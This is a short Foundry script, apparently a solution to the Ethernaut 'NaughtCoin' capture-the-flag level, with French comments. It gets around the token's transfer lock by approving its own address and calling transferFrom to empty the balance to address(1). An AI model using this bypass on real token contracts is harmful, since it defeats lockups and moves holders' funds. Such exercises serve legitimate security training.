// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/NaughtCoinAttack.sol"; // 1) add file

contract SolveNaughtCoin is Script { // 2) change contractName

    function run() external {
    address target = 0x9CA02eE8591427412bdf04D8778e53A41792B47c;
    uint256 pk = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(pk);

    INaughtCoin coin = INaughtCoin(target);

    uint256 balance = coin.balanceOf(vm.addr(pk));

    console.log("La wallet est: ", vm.addr(pk));

    console.log("La balance est: ", coin.balanceOf(vm.addr(pk)));

    // approve depuis TON EOA
    coin.approve(vm.addr(pk), balance);

    // utiliser transferFrom directement
    coin.transferFrom(vm.addr(pk), address(1), balance);

    console.log("La balance est: ", coin.balanceOf(vm.addr(pk)));

    vm.stopBroadcast();
}
}